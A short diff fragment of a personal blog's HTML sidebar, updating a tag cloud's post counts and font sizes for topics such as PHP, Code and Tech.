-	<ul id="tag-cloud" class="blocklist"><a href='http://lenss.nl/tag/-home' style='font-size: 116.84210526315789%'>/home(32)</a> <a href='http://lenss.nl/tag/code' style='font-size: 160.0%'>Code(114)</a> <a href='http://lenss.nl/tag/design' style='font-size: 103.15789473684211%'>Design(6)</a> <a href='http://lenss.nl/tag/freelance' style='font-size: 102.10526315789474%'>Freelance(4)</a> <a href='http://lenss.nl/tag/google' style='font-size: 101.57894736842105%'>Google(3)</a> <a href='http://lenss.nl/tag/javascript' style='font-size: 104.21052631578948%'>Javascript(8)</a> <a href='http://lenss.nl/tag/jquery' style='font-size: 101.05263157894737%'>Jquery(2)</a> <a href='http://lenss.nl/tag/magento' style='font-size: 101.05263157894737%'>Magento(2)</a> <a href='http://lenss.nl/tag/php' style='font-size: 133.68421052631578%'>PHP(64)</a> <a href='http://lenss.nl/tag/security' style='font-size: 104.21052631578948%'>Security(8)</a> <a href='http://lenss.nl/tag/sql' style='font-size: 103.15789473684211%'>SQL(6)</a> <a href='http://lenss.nl/tag/tech' style='font-size: 150.5263157894737%'>Tech(96)</a> <a href='http://lenss.nl/tag/zend' style='font-size: 104.21052631578948%'>Zend(8)</a> </ul>
+	<ul id="tag-cloud" class="blocklist"><a href='http://lenss.nl/tag/-home' style='font-size: 116.69565217391305%'>/home(32)</a> <a href='http://lenss.nl/tag/code' style='font-size: 160.0%'>Code(115)</a> <a href='http://lenss.nl/tag/design' style='font-size: 103.1304347826087%'>Design(6)</a> <a href='http://lenss.nl/tag/freelance' style='font-size: 102.08695652173913%'>Freelance(4)</a> <a href='http://lenss.nl/tag/google' style='font-size: 101.56521739130434%'>Google(3)</a> <a href='http://lenss.nl/tag/javascript' style='font-size: 104.17391304347827%'>Javascript(8)</a> <a href='http://lenss.nl/tag/jquery' style='font-size: 101.04347826086956%'>Jquery(2)</a> <a href='http://lenss.nl/tag/magento' style='font-size: 101.04347826086956%'>Magento(2)</a> <a href='http://lenss.nl/tag/php' style='font-size: 133.91304347826087%'>PHP(65)</a> <a href='http://lenss.nl/tag/security' style='font-size: 104.17391304347827%'>Security(8)</a> <a href='http://lenss.nl/tag/sql' style='font-size: 103.1304347826087%'>SQL(6)</a> <a href='http://lenss.nl/tag/tech' style='font-size: 150.6086956521739%'>Tech(97)</a> <a href='http://lenss.nl/tag/zend' style='font-size: 104.17391304347827%'>Zend(8)</a> </ul>
 	<div style="clear:both;"></div>
 </div>
 <section>
